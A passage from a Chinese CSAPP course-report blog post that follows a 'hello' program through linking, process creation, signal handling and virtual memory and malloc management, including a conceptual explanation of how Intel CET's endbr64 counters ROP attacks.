class="headerlink" title="5.5.3 新增代码endbr64"></a>5.5.3 新增代码endbr64</h4><p>可以观察到，由 hello 反汇编生成的代码中有一句出现的频率非常高，那就是 endbr64，几乎在每一个函数或者代码片段的开头都是这句代码，非常有意思。</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402031533458.png" alt="endbr64"></p><p>其实这是 Intel 的 CET 技术，这个机制主要是用来对抗 ROP 攻击。我们在第 3 章学到，黑客可以利用缓冲区溢出来进行攻击，使程序执行黑客想要执行的程序，增加系统风险。而 CPU 和操作系统也采用了相应措施来避免这个风险：</p><ul><li>栈随机化。这段程序分配的栈的位置在每次运行时都是随机的，这就使我们无法确定在哪里插入代码</li><li>限制可执行代码区域。它限制栈上存放的代码是不可执行的。</li></ul><p>但是这些措施却无法阻挡 ROP 攻击。什么是 ROP 攻击呢？ROP：面向返回的程序设计，所谓 ROP 攻击就是黑客在已经存在的程序中找到特定的以 ret 结尾的指令序列为我们所用，称这样的代码段为 gadget，把要用到部分的地址压入栈中，每次 ret 后又会取出一个新的 gadget，于是这样就能形成一个程序链，从而实现黑客的目的。我喜欢将这种攻击方式称作“就地取材，拼凑代码”，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402031534763.png" alt="ROP"></p><p>对于 ROP 攻击也能找到解决办法，就是每次在跳转后，检查这段代码是不是程序想要的代码，也就是 CET 技术。CET 通过编译器在合理的间接跳转 (call&#x2F;jmp) 中用新的指令做标记，新指令包含 endbr32 和 endbr64。程序每次执行跳转时，CPU 都会判断下一条指令是不是 endbr32&#x2F;endbr64 指令，如果是则正常执行，如果不是，则会触发 #CP 异常。</p><p>这也就是每个代码段和函数开头都有一句 endbr64的原因了。</p><p>关于 ROP，在 Attack Lab 中有更深入的讲解，并进行了攻击实践。</p><h4 id="5-5-4-函数调用与跳转"><a href="#5-5-4-函数调用与跳转" class="headerlink" title="5.5.4 函数调用与跳转"></a>5.5.4 函数调用与跳转</h4><p>由于hello文件已经是重定位后的可执行目标文件，所以每一个 call&#x2F;jmp 语句的目标地址就是确切的虚拟地址。</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402031535254.png" alt="调用"></p><h3 id="5-6-hello的执行过程"><a href="#5-6-hello的执行过程" class="headerlink" title="5.6 hello的执行过程"></a>5.6 hello的执行过程</h3><p>当在 Shell 中运行 hello 时，Shell 会调用驻留在存储器中的加载器来运行它。当加载器运行时，它创建如图的内存映像：</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402031535437.png" alt="内存映像"></p><p>在 ELF 头部表的引导下，加载器将可执行文件的片复制到代码段和数据段。接下来加载器跳转到程序的入口点，也就是 _start 函数的地址。这个函数是在系统目标文件 ctrl.o 中定义的。_start 函数调用系统启动函数 __libc_start_main，该函数定义在 <a href="http://libc.so/">libc.so</a> 中。它初始化执行环境，调用用户层的 main 函数，处理 main 函数的返回值，并且在需要的时候把控制返回给内核。</p><p>下面我使用 gdb 进行调试，逐步查看程序的执行过程：</p><p>函数入口为 0x4010f0，所以执行 hello 后，程序先从 _start 开始执行，所以我将断点打在 _start 处：</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402031536189.png" alt="断点1"></p><p>接下来单步调试运行：</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402031536803.png" alt="调试"></p><p>接下来会调用 main 函数，程序并不是直接调用 main 函数，而是先来到 __libc_start_main，用来向 main 函数传递参数，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402031536246.png" alt=" __libc_start_main"></p><p>接下来，分别跳转至 GI_cxa_atexit，lll_cas_lock，new_exitfn</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402031537137.png" alt="分别跳转"></p><p>结束后，又回到了 __libc_start_main，随后来到 __libc_csu_init 部分，这部分代码在 hello 反汇编生成的汇编代码中也能看到。</p><p>随后，来到 init，再返回 __libc_csu_init，然后再返回 __libc_start_main，然后来到 _setjmp 和 __sigsetjmp 以及 __sigjmp_save，最后又返回 __libc_start_main</p><p>然后才来到 main，根据输入的不同，main 可能会调用 puts，printf，getchar，atoi，exit，sleep 函数</p><p>然后调用 __GI__IO_puts，__strlen_avx2，回到 __GI__IO_puts</p><p>然后调用 __lll_cas_lock，然后又回到 __GI__IO_puts，然后调用 IO_validate_vtable，又回到 __GI__IO_puts，然后调用 _IO_new_file_xsputn，然后调用 IO_validate_vtable</p><p>又回到 _IO_new_file_xsputn，又调用 _IO_new_file_overflow，再调用 __GI__IO_doallocbuf，再调用 IO_validate_vtable，又调用 __GI__IO_doallocbuf，再调用 __GI__IO_file_doallocate，调用 __GI__IO_file_stat，__GI___fxstat</p><p>回到 __GI__IO_file_doallocate，调用 malloc@plt，调用 __GI___libc_malloc，再调用 malloc_hook_ini，又调用 _dl_find_dso_for_object 随后调用 __GI__dl_addr</p><p>然后回到 _IO_new_file_overflow 又回到 _IO_new_file_xsputn</p><p>然后又回到 __GI__IO_puts，回到 main</p><p>最后调用 exit，调用 __GI_exit 再调用 __run_exit_handlers，__GI___call_tls_dtors</p><p>回到 __run_exit_handlers，调用 __GI___call_tls_dtors，再回到 __run_exit_handlers，然后调用 _IO_cleanup，再调用 _IO_flush_all_lockp</p><p>回到 __run_exit_handlers，调用 __GI__exit，再回到 main</p><p>调用关系如图：</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402031538968.png" alt="调用关系"></p><h3 id="5-7-Hello的动态链接分析"><a href="#5-7-Hello的动态链接分析" class="headerlink" title="5.7 Hello的动态链接分析"></a>5.7 Hello的动态链接分析</h3><p>在进行动态链接前，首先进行静态链接，生成部分链接的可执行目标文件 hello。此时共享库中的代码和数据没有被合并到 hello 中。只有在加载 hello 时，动态链接器才对共享目标文件中的相应模块内的代码和数据进行重定位，加载共享库，生成完全链接的可执行目标文件。</p><p>比如查看 _GLOBAL_OFFSET_TABLE 的内容：</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402031538341.png" alt="GLOBAL_OFFSET_TABLE"></p><h3 id="5-8-本章小结"><a href="#5-8-本章小结" class="headerlink" title="5.8 本章小结"></a>5.8 本章小结</h3><p>本章详细介绍了 hello 的链接过程，比对链接后的 hello 与 hello.o 的不同，并拓展讲解了 endbr64 的作用，最后使用 gdb 工具逐行查看 hello 的运行过程。</p><p>至此，我们的 hello 就成为了一个具有完整躯体与精神的青年了，也是时候让他进入社会，成为操作系统中运行的进程！</p><h2 id="第6章-hello进程管理"><a href="#第6章-hello进程管理" class="headerlink" title="第6章 hello进程管理"></a>第6章 hello进程管理</h2><h3 id="6-1-进程的概念与作用"><a href="#6-1-进程的概念与作用" class="headerlink" title="6.1 进程的概念与作用"></a>6.1 进程的概念与作用</h3><h4 id="6-1-1-进程的概念"><a href="#6-1-1-进程的概念" class="headerlink" title="6.1.1 进程的概念"></a>6.1.1 进程的概念</h4><p>进程(process)，是操作系统对一个正在运行的程序的一种抽象。进程是程序的基本执行实体；在面向线程设计的系统（如当代多数操作系统、Linux 2.6及更新的版本）中，进程本身不是基本执行单位，而是线程的容器。程序本身只是指令、数据及其组织形式的描述，相当于一个名词，进程才是程序（那些指令和数据）的真正执行实例，</p><h4 id="6-1-2-进程的作用"><a href="#6-1-2-进程的作用" class="headerlink" title="6.1.2 进程的作用"></a>6.1.2 进程的作用</h4><p>hello 在运行时，操作系统会提供一种假象，就好像系统上只有这个程序在运行。程序看上去是独占地使用处理器、主存和 I&#x2F;O 设备。处理器看上去就像在不间断地一条接一条地执行程序中的指令，即该程序的代码和数据是系统内存中唯一的对象。这些假象就是通过进程来实现的。</p><h3 id="6-2-简述Shell-bash-的作用与处理流程"><a href="#6-2-简述Shell-bash-的作用与处理流程" class="headerlink" title="6.2 简述Shell-bash 的作用与处理流程"></a>6.2 简述Shell-bash 的作用与处理流程</h3><p>Shell 是一种交互型的应用级程序，用户能够通过 Shell 与操作系统内核进行交互，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402031543144.png" alt="shell"></p><p>Shell 处理流程：</p><ol><li>在 Shell 中输入 hello 程序的路径</li><li>Shell 判断用户输入的是否为内置命令，如果不是，就认为它是一个可执行目标文件</li><li>Shell 构造 argv 和 envp</li><li>Shell 使用 fork() 创建子进程，调用 execve() 函数在新创建的子基础南横的上下文中加载并运行 hello 程序。将 hello 中的 .text 节、.data 节、.bss 节等内容加载到当前进程的虚拟地址空间</li><li>execve() 函数调用加载器，跳转到程序的入口点，开始执行 _start 函数，我们的 hello 程序便正式开始执行了</li></ol><h3 id="6-3-Hellode-fork进程创建过程"><a href="#6-3-Hellode-fork进程创建过程" class="headerlink" title="6.3 Hellode fork进程创建过程"></a>6.3 Hellode fork进程创建过程</h3><p>Linux 通过 clone() 系统调用来实现 fork()，由于 clone() 可以自主选择需要复制的资源，所以这个系统调用需要传入很多的参数标志用于指明父子进程需要共享的资源。fork()，vfork()，__clone() 函数都需要根据各自传入的参数去底层调用 clone() 系统调用，然后再由 clone() 去调用 do_fork()。do_fork() 完成了创建的大部分工作，该函数调用 copy_process() 函数,然后让进程开始运行。</p><p>copy_process() 函数是核心，他的工作分为这几步：</p><ol><li>调用 dup_task_struct() 为新进程创建一个内核栈，thread_info 结构和 task_struct，这些值和当前进程的值相同。也就是说，当前子进程和父进程的进程描述符是一致的。</li><li>检查一次，确保创建新进程后，拥有的进程数目没有超过给它分配的资源和限制。所有进程的 task_struct 结构中都有一个数组 rlim，这个数组中记载了该进程对占用各种资源的数目限制，所以如果该用户当前拥有的进程数目已经达到了峰值，则不允许继续 fork()。这个值为 PID_MAX，大小为 0x8000，也就是说进程号的最大值为 0x7fff，即短整型变量 short 的大小 32767，其中 0~299 是为系统进程（包括内核线程）保留的，主要用于各种“保护神进程”。</li><li>子进程为了将自己与父进程区分开来，将进程描述符中的许多成员全部清零或者设为初始值。不过大多数数据都未修改。</li><li>将子进程的状态设置为 TASK_UNINTERRUPTIBLE 深度睡眠，不可被信号唤醒，以保证子进程不会投入运行。</li><li>copy_process() 函数调用 copy_flags() 以更新 task_struct 中的 flags 成员。其中表示进程是否拥有超级用户管理权限的 PF_SUPERPRIV 标志被清零，表示进程还没有调用 exec() 函数的 PF_FORKNOEXEC 标志也被清零。</li><li>调用 alloc_pid 为子进程分配一个有效的 PID</li><li>根据传递给 clone() 的参数标志，调用 do_fork()-&gt;copy_process() 拷贝或共享父进程打开的文件，信号处理函数，进程地址空间和命名空间等。一般情况下，这些资源会给进程下的所有线程共享。</li><li>最后，copy_process() 做扫尾工作并返回一个指向子进程的指针。</li></ol><h3 id="6-4-Hello的execve过程"><a href="#6-4-Hello的execve过程" class="headerlink" title="6.4 Hello的execve过程"></a>6.4 Hello的execve过程</h3><p>execve() 函数加载并运行可执行目标文件，且带参数列表 argv 和环境变量列表 envp，execve() 函数调用一次从不返回。它的执行过程如下：</p><ol><li>删除已存在的用户区域</li><li>映射私有区：为 hello 的代码、数据、.bss 和栈区域创建新的区域结构，所有这些区域都是私有的、写时才复制的</li><li>映射共享区：比如 hello 程序与共享库 <a href="http://libc.so/">libc.so</a> 链接</li><li>设置 PC：exceve() 做的最后一件事就是设置当前进程的上下文中的程序计数器，使之指向代码区域的入口点</li><li>execve() 在调用成功的情况下不会返回，只有当出现错误时，例如找不到需要执行的程序时，execve() 才会返回到调用程序</li></ol><h3 id="6-5-Hello的进程执行"><a href="#6-5-Hello的进程执行" class="headerlink" title="6.5 Hello的进程执行"></a>6.5 Hello的进程执行</h3><h4 id="6-5-1-逻辑控制流"><a href="#6-5-1-逻辑控制流" class="headerlink" title="6.5.1 逻辑控制流"></a>6.5.1 逻辑控制流</h4><p>操作系统将一个 CPU 物理控制流，分成多个逻辑控制流，每个进程独占一个逻辑控制流。当一个逻辑控制流执行的时候，其他的逻辑控制流可能会临时暂停执行。一般来说，每个逻辑控制流都是独立的。当两个逻辑控制流在时间上发生重叠，我们说是并行的。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402031545870.png" alt="逻辑控制流"></p><p>处理器在多个进程中来回切换称为多任务，每个时间当处理器执行一段控制流称为时间片。因此多任务也指时间分片。</p><h4 id="6-5-2-用户模式和内核模式"><a href="#6-5-2-用户模式和内核模式" class="headerlink" title="6.5.2 用户模式和内核模式"></a>6.5.2 用户模式和内核模式</h4><p>为了限制一个应用可以执行的指令以及它可以访问的地址空间范围，处理器用一个控制寄存器中的一个模式位来描述进程当前的特权。如图是 x86 CPU 提供的环保护机制：</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402031545878.webp" alt="环保护机制"></p><p>内核工作在 0 环，用户工作在 3 环，中间环留给中间软件用。Linux 仅用第 0 和第 3 环，即用户模式和内核模式。</p><p><strong>用户模式：</strong>用户模式中的进程不允许执行特权指令，比如停止处理器、改变模式位，或者发起一个 I&#x2F;O 操作。也不允许用户模式的进程直接引用地址空间中内核区内的代码和数据。用户程序必须通过系统调用接口间接地访问内核代码和数据。</p><p>进程从用户模式变为内核模式的唯一方法是通过诸如中断、故障或者陷入系统调用这样的异常。当异常发生时，控制传递到异常处理程序，处理器将模式从用户模式变为内核模式。处理程序运行在内核模式中，当它返回到应用程序代码时，处理器就把模式从内核模式改回到用户模式。</p><h4 id="6-5-3-上下文切换"><a href="#6-5-3-上下文切换" class="headerlink" title="6.5.3 上下文切换"></a>6.5.3 上下文切换</h4><p>操作系统内核为每个进程维护一个上下文。所谓上下文就是内核重新启动一个被抢占的进程所需的状态。它由一些对象的值组成，这些对象包括通用寄存器、浮点寄存器、程序计数器、用户栈、状态寄存器、内核栈和各种内核数据结构，比如描述地址空间的页表，包含有关当前进程信息的进程表，以及包含进程已打开文件的信息的文件表。</p><h4 id="6-5-3-Hello的执行"><a href="#6-5-3-Hello的执行" class="headerlink" title="6.5.3 Hello的执行"></a>6.5.3 Hello的执行</h4><p>从 Shell 中运行 hello 时，它运行在用户模式，运行过程中，内核不断切换上下文，使运行过程被切分成时间片，与其他进程交替占用执行，实现进程的调度。如果在运行过程中收到信号等，那么就会进入内核模式，运行信号处理程序，之后再返回用户模式。</p><h3 id="6-6-Hello的异常与信号处理"><a href="#6-6-Hello的异常与信号处理" class="headerlink" title="6.6 Hello的异常与信号处理"></a>6.6 Hello的异常与信号处理</h3><p>异常可以分为四类：中断、陷阱、故障和终止。它们的性质如图：</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402031547971.png" alt="异常的性质"></p><p><strong>中断：</strong>比如在 hello 运行过程中，我们敲击键盘，那么就会触发中断，系统调用内核中的中断处理程序执行，然后返回，hello 继续执行，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402031547503.png" alt="中断"></p><p><strong>陷阱：</strong>陷阱就是系统调用，我们的 hello 运行在用户模式下，无法直接运行内核中的程序，比如像 fork，exit 这样的系统调用。于是就通过陷阱的方式，执行 systemcall 指令，内核调用陷阱处理程序来执行系统调用，如图：</p><p><img src="https://pic4.zhimg.com/v2-019d75eae05738e1eacc49ce6d2a669f_r.jpg" alt="陷阱"></p><p><strong>故障：</strong>当我们的 hello 运行时，当某一条指令引用一个虚拟地址，而地址相对应的物理页面不在内存中，就会发生故障。内核调用故障处理程序（这里是缺页处理程序），缺页处理程序从磁盘中加载适当的页面，然后将控制返回给引起故障的指令，该指令就能顺畅地执行了。</p><p>当然，也有一些故障会使程序直接终止。</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402031547487.png" alt="故障"></p><p><strong>终止：</strong>hello 在运行时，也有可能遇到硬件错误，那就只能自认倒霉，终止 hello 的运行。</p><h4 id="6-6-2-信号"><a href="#6-6-2-信号" class="headerlink" title="6.6.2 信号"></a>6.6.2 信号</h4><p>使用 man 7 signal 查看 Linux 信号如图：</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402031548294.png" alt="信号"></p><p>我在hello运行过程中，测试其中部分信号。</p><p><strong>SIGSTP：</strong>当 hello 在前台运行时，按下 Ctrl+z 会向它发送 SIGSTP 信号，这个进程就会暂时挂起，可以使用 fg %<pid> 命令，让它在前台继续执行：</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402031548263.png" alt="SIGSTP"></p><p><strong>SIGINT：</strong>当 hello 在前台运行时，按下 Ctrl+c 会向它发送 SIGINT 信号，这个进程就会被终止：</p><p><img src="https://pic4.zhimg.com/v2-e5a80277f98f1afb4e24cf8028e07e4b_r.jpg" alt="SIGINT"></p><p>也可以在执行 hello 程序的命令后面加上 &amp;，这样它就会在后台运行，分别使用 ps 和 jobs 来查看 hello 进程。</p><p><img src="https://pic3.zhimg.com/v2-70fee69d9718e2b0b80fb1e31e2be2ca_r.jpg" alt="执行"></p><p>ps 和 jobs 的区别在于，ps 会打印系统中的所有进程，包括我正在使用的终端 Shell，而 job 只会打印 Shell 正在维护的进程，它不会包括自己。</p><p>当进程在后台运行时，我们用键盘发送的信号是无法发送给它，这时可以用 kill 命令来终止它：</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402031548255.png" alt="kill"></p><h3 id="6-7本章小结"><a href="#6-7本章小结" class="headerlink" title="6.7本章小结"></a>6.7本章小结</h3><p>这章讲解了 hello 如何运行在操作系统的上下文中，以及它如何受到信号的控制。</p><h2 id="第7章-hello的存储管理"><a href="#第7章-hello的存储管理" class="headerlink" title="第7章 hello的存储管理"></a>第7章 hello的存储管理</h2><h3 id="7-1-hello的存储器地址空间"><a href="#7-1-hello的存储器地址空间" class="headerlink" title="7.1 hello的存储器地址空间"></a>7.1 hello的存储器地址空间</h3><p>我们的 hello 进程是与其它进程共享 CPU 和主存资源的，为了更加有效地管理内存并且少出错，现代操作系统提供了一种对主存的抽象概念，叫做虚拟内存。虚拟内存时硬件异常、硬件地址翻译、主存、磁盘文件和内核软件的完美交互，它为每个进程提供了一个大的、一致的和私有的地址空间。首先确定一些概念</p><ol><li>逻辑地址：格式为“段地址:偏移地址”，是 CPU 生成的地址，在内部和编程使用，并不唯一。</li><li>线性地址：逻逻辑地址到物理地址变换之间的中间层，逻辑地址经过段机制后转化为线性地址。</li><li>虚拟地址：保护模式下，hello 运行在虚拟地址空间中，它访问存储器所用的逻辑地址。</li><li>物理地址：加载到内存地址寄存器中的地址，内存单元的真正地址。CPU 通过地址总线的寻址，找到真实的物理内存对应地址。</li></ol><h3 id="7-2-Intel逻辑地址到线性地址的变换-段式管理"><a href="#7-2-Intel逻辑地址到线性地址的变换-段式管理" class="headerlink" title="7.2 Intel逻辑地址到线性地址的变换-段式管理"></a>7.2 Intel逻辑地址到线性地址的变换-段式管理</h3><p>在 Intel 平台下的实模式中，逻辑地址为：CS：EA，CS 是段寄存器，将 CS 里的值左移四位，再加上 EA 就是线性地址。</p><p>而保护模式下，要用段描述符作为下标，到 GDT（全局描述符表）&#x2F;LAT（局部描述符表）中查表获得段地址，段地址+偏移地址就是线性地址。</p><p>段描述符是一个 16 位字长的字段，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402031551956.webp" alt="段描述符"></p><p>TI 位指示选择 GDT 还是 LDT，前 13 位作为索引来确定段描述符在描述符表中的位置。从段描述符和偏移地址得到线性地址的过程如图：</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402031551966.png" alt="线性地址"></p><h3 id="7-3-Hello的线性地址到物理地址的变换-页式管理"><a href="#7-3-Hello的线性地址到物理地址的变换-页式管理" class="headerlink" title="7.3 Hello的线性地址到物理地址的变换-页式管理"></a>7.3 Hello的线性地址到物理地址的变换-页式管理</h3><p>VM 系统将虚拟内存分割为成为虚拟页的大小固定的快，物理内存也被分割为物理页，成为页帧。虚拟页面就可以作为缓存的工具，被分为三个部分：</p><ul><li>未分配的：VM 系统还未分配的页</li><li>已缓存的：当前已缓存在物理内存中的已分配页</li><li>未缓存的：未缓存在物理内存的已分配页</li></ul><p>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402031552271.png" alt="磁盘分配"></p><h3 id="7-4-TLB与四级页表支持下的VA到PA的变换"><a href="#7-4-TLB与四级页表支持下的VA到PA的变换" class="headerlink" title="7.4 TLB与四级页表支持下的VA到PA的变换"></a>7.4 TLB与四级页表支持下的VA到PA的变换</h3><p>页表是 PTE（页表条目）的数组，它将虚拟页映射到物理页，每个 PTE 都有一个有效位和一个 n 位地址字段，有效位表明该虚拟页是否被缓存在 DRAM 中，地址字段表明 DRAM 中相应物理页的起始位置，它分为两个部分：VPO（虚拟页面偏移）和 VPN（虚拟页号），如图：</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402031552804.png" alt="四级页表"></p><h3 id="7-4-1-TLB加速地址翻译"><a href="#7-4-1-TLB加速地址翻译" class="headerlink" title="7.4.1 TLB加速地址翻译"></a>7.4.1 TLB加速地址翻译</h3><p>为了优化 CPU 产生一个虚拟地址后，MMU 查阅 PTE的过程，在 MMU 中设置一个关于 PTE 的小缓存，称为 TLB（翻译后备缓冲器）。像普通的缓存一样，TLB 的索引和标记是从 PTE 中的 VPN 提取出来的，如图：</p><p><img src="https://pic4.zhimg.com/v2-b8e6d6540726714757f0abb484603ddb_r.jpg" alt="img"></p><h3 id="7-4-2-四级页表翻译"><a href="#7-4-2-四级页表翻译" class="headerlink" title="7.4.2 四级页表翻译"></a>7.4.2 四级页表翻译</h3><p>Core i7 采用四级页表层次结构，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402031553090.png" alt="四级"></p><p>每次 CPU 产生一个虚拟地址后，通过它的 VPN 部分看 TLB 中是否缓存，如果命中，直接得到 PPN，将虚拟地址中的 VPO 作为物理页偏移，这样就能得到物理地址；如果 TLB 不命中，则经过四级页表的查找得到最终的PTE，从而得到 PPN，进而得到物理地址。</p><h3 id="7-5-三级Cache支持下的物理内存访问"><a href="#7-5-三级Cache支持下的物理内存访问" class="headerlink" title="7.5 三级Cache支持下的物理内存访问"></a>7.5 三级Cache支持下的物理内存访问</h3><p>得到物理地址后，将物理地址分为 CT（标记位）、CI(组索引) 和 CO（块偏移）。根据 CI 查找 L1 缓存中的组，依次与组中每一行的数据比较，有效位有效且标记位一致则命中。如果命中，直接返回想要的数据。如果不命中，就依次去 L2、L3 缓存判断是否命中，命中时将数据传给 CPU 同时更新各级缓存。</p><h3 id="7-6-hello进程fork时的内存映射"><a href="#7-6-hello进程fork时的内存映射" class="headerlink" title="7.6 hello进程fork时的内存映射"></a>7.6 hello进程fork时的内存映射</h3><p>在 Shell 输入命令行后，内核调用fork创建子进程，为 hello 程序的运行创建上下文，并分配一个与父进程不同的PID。通过 fork 创建的子进程拥有父进程相同的区域结构、页表等的一份副本，同时子进程也可以访问任何父进程已经打开的文件。当 fork 在新进程中返回时，新进程现在的虚拟内存刚好和调用 fork 时存在的虚拟内存相同，当这两个进程中的任一个后来进行写操作时，写时复制机制就会创建新页面，因此，也就为每个进程保持了私有地址空间。</p><h3 id="7-7-hello进程execve时的内存映射"><a href="#7-7-hello进程execve时的内存映射" class="headerlink" title="7.7 hello进程execve时的内存映射"></a>7.7 hello进程execve时的内存映射</h3><p>execve() 函数调用驻留在内核区域的启动加载器代码，在当前进程中加载并运行包含在可执行目标文件 hello 中的程序，用 hello 程序有效地替代了当前程序。加载并运行 hello 需要以下几个步骤：</p><ol><li>删除已存在的用户区域，删除当前进程虚拟地址的用户部分中的已存在的区域结构。</li><li>映射私有区域，为新程序的代码、数据、bss 和栈区域创建新的区域结构，所有这些新的区域都是私有的、写时复制的。代码和数据区域被映射为 hello 文件中的 .text 和 .data 区，bss 区域是请求二进制零的，映射到匿名文件，其大小包含在 hello 中，栈和堆地址也是请求二进制零的，初始长度为零。</li><li>映射共享区域， hello 程序与共享对象 <a href="http://libc.so/">libc.so</a> 链接，<a href="http://libc.so/">libc.so</a> 是动态链接到这个程序中的，然后再映射到用户虚拟地址空间中的共享区域内。</li><li>设置程序计数器（PC），execv() 做的最后一件事情就是设置当前进程上下文的程序计数器，使之指向代码区域的入口点。</li></ol><p><img src="https://pic1.zhimg.com/v2-624efd0bb2f6b18ddfa640eee05bdf2c_r.jpg" alt="img"></p><h3 id="7-8-缺页故障与缺页中断处理"><a href="#7-8-缺页故障与缺页中断处理" class="headerlink" title="7.8 缺页故障与缺页中断处理"></a>7.8 缺页故障与缺页中断处理</h3><p>正如前面讲到的，hello 在运行时，很有可能会发生缺页故障，大致流程已经在 6.6.1 中做了阐述。当 CPU 产生的一个虚拟地址并不在 DRAM 缓存中时，缺页异常处理程序会选择一个牺牲页，用要读取的地址的内容替换它，然后内核重新启动导致缺页的指令。</p><h3 id="7-9-动态存储分配管理"><a href="#7-9-动态存储分配管理" class="headerlink" title="7.9 动态存储分配管理"></a>7.9 动态存储分配管理</h3><p>hello 在运行时，它调用的 printf 函数会调用malloc函数，动态存储分配管理又是操作系统的一个伟大设计！</p><h4 id="7-9-1-堆"><a href="#7-9-1-堆" class="headerlink" title="7.9.1 堆"></a>7.9.1 堆</h4><p>动态内存分配器维护着一个进程的虚拟内存区域，称为堆。如图：</p><p><img src="https://pic4.zhimg.com/v2-f2c774e8b6c8fa8a727a58e0ab3ab34b_r.jpg" alt="堆"></p><p>分配器将堆视为一组大小不同的块的集合来维护，且它们的地址是连续的。将块标记为两种，已分配的块供应用程序使用，空闲块用来分配</p><h4 id="7-9-2-隐式空闲链表管理"><a href="#7-9-2-隐式空闲链表管理" class="headerlink" title="7.9.2 隐式空闲链表管理"></a>7.9.2 隐式空闲链表管理</h4><p>想要设计好的数据结构维护空闲块需要考虑以下方面：</p><ol><li>空闲块组织：利用隐式空闲链表记录空闲块</li><li>放置策略：如何选择合适的空闲块分配？<ol><li>首次适配：从头开始搜索空闲链表，选择第一个合适的空闲块</li><li>下一次适配：从上一次查询结束的地方开始搜索选择第一个合适的空闲块</li><li>最佳适配：搜索能放下请求大小的最小空闲块</li></ol></li><li>分割：在将一个新分配的块放置到某个空闲块后，剩余的部分要进行处理</li><li>合并：释放某个块后，要让它与相邻的空闲块合并</li></ol><p>每个空闲块的结构如下：</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402031553114.png" alt="空闲块结构"></p><ul><li>脚部与头部是相同的，均为 4 个字节，用来存储块的大小，以及表明这个块是已分配还是空闲块</li><li>由于要求块双字对齐，所以块大小就总是 8 的倍数，低 3 位总是为 0，因而，我们只需要利用头部和脚部的高29 位存储块的大小，剩下 3 位的最低位来指明这个块是否空闲，000 为空闲，001 为已分配</li></ul><p>为什么既设置头部又设置尾部呢？这是为了能够以常数时间来进行块的合并。无论是与下一块还是与上一块合并，都可以通过他们的头部或尾部得知块大小，从而定位整个块，避免了从头遍历链表。空闲块怎么组织呢？如图：</p><p><img src="https://pic2.zhimg.com/v2-8afa38804c79597f739f6bbee1dfc4d9_r.jpg" alt="空闲块"></p><p>堆有两个特殊的标记：</p><ul><li>序言块：8 个字节，由一个头部和一个脚部组成</li><li>结尾块：大小为 0 的头部</li></ul><p>为了消除合并空闲块时边界的考虑，将序言块和结尾块的分配位均设置为已分配。为了保证双字对齐，在序言块的前面还设置了 4 个字节作为填充。</p><h4 id="7-9-3-显式空闲链表管理"><a href="#7-9-3-显式空闲链表管理" class="headerlink" title="7.9.3 显式空闲链表管理"></a>7.9.3 显式空闲链表管理</h4><p>真实的操作系统实际上使用的是显示空闲链表管理。它的思路是维护多个空闲链表，每个链表中的块有大致相等的大小，分配器维护着一个空闲链表数组，每个大小类一个空闲链表，当需要分配块时只需要在对应的空闲链表中搜索就好了，有两种分离存储的方法</p><p><strong>简单分离存储：</strong>从不合并与分离，每个块的大小就是大小类中最大元素的大小。例如大小类为 {17~32}，则需要分配块的大小在这个区间时均在此对应链表进行分配，并且都是分配大小为 32 的块。这样做，显然分配和释放都是常数级的，但是空间利用率较低</p><p><strong>分离适配：</strong>每个大小类的空闲链表包含大小不同的块，分配完一个块后，将这个块进行分割，并根据剩下的块的大小将其插入到适当大小类的空闲链表中。这个做法平衡了搜索时间与空间利用率，C 标准库提供的 GNU malloc 包就是采用的这种方法。</p><h3 id="7-10本章小结"><a href="#7-10本章小结" class="headerlink" title="7.10本章小结"></a>7.10本章小结</h3><p>本章介绍了现代操作系统的灵魂：存储器地址空间、段式管理、页式管理，VA 到 PA 的变换、物理内存访问， hello 进程 fork 时和 execve 时的内存映射、缺页故障与缺页中断处理、包括隐式空闲链表和显式空闲链表的动态存储分配管理。这些巧妙的设计使得我们的 hello 最终得以运行。</p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>至此，hello 终于走完了它的一生，让我们为它的一生做个小结：</p><ul><li>程序设计者编写出它的基因——hello.c</li><li>预处理器完善它的基因——hello.i</li><li>编译器为它注入的灵魂——hello.s</li><li>汇编器为它的诞生做最后的准备——hello.o</li><li>链接器让它长出完整的躯体——hello</li><li>Shell 为它创建子进程，让它真正成为系统中的个体</li><li>加载器映射虚拟内存，给予它成长的条件</li><li>CPU 的逻辑控制流让它驰骋在硬件与操作系统之上</li><li>虚拟地址这一计算机系统最伟大的抽象为它的驰骋导航</li><li>malloc 的高效管理让它的驰骋拥有更广阔的天地</li><li>信号与异常约束它的行为，让它总是走在康庄大道之上</li><li>当 hello 垂垂老矣，运行完最后一行代码，__libc_start_main 将控制转移给内核，Shell 回收子进程，内核删除与它相关的所有数据结构，它在这个世界的所有痕迹至此被抹去。</li></ul><p>回首它的一生，惊心动魄，千难万险。其中的每个阶段无不凝结着人类最伟大的智慧！</p>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
